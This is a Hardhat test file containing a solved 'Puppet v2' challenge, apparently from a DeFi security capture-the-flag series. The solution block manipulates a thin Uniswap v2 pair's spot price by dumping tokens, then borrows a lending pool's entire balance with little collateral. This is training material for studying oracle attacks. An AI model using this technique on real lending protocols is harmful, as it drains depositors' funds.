import { ethers } from 'hardhat';
import { expect } from 'chai';
import { time, setBalance } from '@nomicfoundation/hardhat-network-helpers';
import factoryJson from '@uniswap/v2-core/build/UniswapV2Factory.json';
import pairJson from '@uniswap/v2-core/build/UniswapV2Pair.json';
import routerJson from '@uniswap/v2-periphery/build/UniswapV2Router02.json';
import { UniswapV2Factory, UniswapV2Pair, UniswapV2Router02 } from '../../typechain-types';

describe('[Challenge] Puppet v2', function () {
  it('should take all tokens from the lending pool', async function () {
    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n;
    const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    const [deployer, player] = await ethers.getSigners();

    await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
    expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);

    // Deploy tokens to be traded
    const token = await ethers.deployContract('DamnValuableToken');
    const weth = await ethers.deployContract('WETH');

    // Deploy Uniswap Factory and Router
    const uniswapFactory = (await (
      await ethers.getContractFactory(factoryJson.abi, factoryJson.bytecode)
    ).deploy(ethers.ZeroAddress)) as UniswapV2Factory;
    const uniswapRouter = (await (
      await ethers.getContractFactory(routerJson.abi, routerJson.bytecode)
    ).deploy(uniswapFactory, weth)) as UniswapV2Router02;

    // Create Uniswap pair against WETH and add liquidity
    await token.approve(uniswapRouter, UNISWAP_INITIAL_TOKEN_RESERVE);
    await uniswapRouter.addLiquidityETH(
      token,
      UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
      0, // amountTokenMin
      0, // amountETHMin
      deployer, // to
      (await time.latest()) * 2, // deadline
      { value: UNISWAP_INITIAL_WETH_RESERVE }
    );
    const uniswapExchange = (await ethers.getContractAt(
      pairJson.abi,
      await uniswapFactory.getPair(token, weth)
    )) as unknown as UniswapV2Pair;
    expect(await uniswapExchange.balanceOf(deployer)).to.be.gt(0);

    // Deploy the lending pool
    const lendingPool = await ethers.deployContract('PuppetV2Pool', [weth, token, uniswapExchange, uniswapFactory]);

    // Setup initial token balances of pool and player accounts
    await token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
    await token.transfer(lendingPool, POOL_INITIAL_TOKEN_BALANCE);

    // Check pool's been correctly setup
    expect(await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)).to.eq(3n * 10n ** 17n);
    expect(await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)).to.eq(300000n * 10n ** 18n);

    /** CODE YOUR SOLUTION HERE */
    await token.connect(player).approve(uniswapRouter, PLAYER_INITIAL_TOKEN_BALANCE);
    await uniswapRouter
      .connect(player)
      .swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, [token, weth], player, (await time.latest()) * 2);

    const requiredWETH = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
    await weth.connect(player).deposit({ value: requiredWETH });
    await weth.connect(player).approve(lendingPool, requiredWETH);
    await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);

    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    // Player has taken all tokens from the pool
    expect(await token.balanceOf(lendingPool)).to.be.eq(0);

    expect(await token.balanceOf(player)).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
  });
});
